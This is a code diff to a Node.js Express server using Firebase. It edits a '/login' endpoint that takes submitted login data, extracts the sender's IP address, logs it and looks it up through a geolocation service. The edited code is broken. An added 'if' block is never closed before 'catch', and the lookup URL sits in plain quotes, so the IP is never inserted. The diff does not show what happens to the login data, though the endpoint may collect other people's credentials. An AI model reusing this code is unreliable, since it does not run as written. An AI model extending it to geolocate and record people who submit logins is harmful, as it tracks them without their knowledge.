@@ -23,12 +23,17 @@ const db = admin.database();
 // 📡 Login data receive panna
 app.post("/login",async (req, res) => {
   const data = req.body;
-const rawIP=req.headers['x-forwarded-for']||req.ip;
-  const ip=rawIP.split(",")[0].trim();
+const rawIP=req.headers['x-forwarded-for']||req.socket.remoteAddress||req.ip;
+  const ip=rawIP ? rawIP.split(",")[0].trim():"0.0.0.0";
+  console.log("Real IP:",ip);
   let geoData={};
   try{
     const geoRes=await fetch('https://ipwho.is/${ip}');
     geoData=await geoRes.json();
+    console.log("Geo Data:",geoData);
+    if(!geoData.success){
+      geoData.city="N/A";
+      geoData.country="N/A";
   }catch(err){
     console.log("Geo API error:",err);
   }
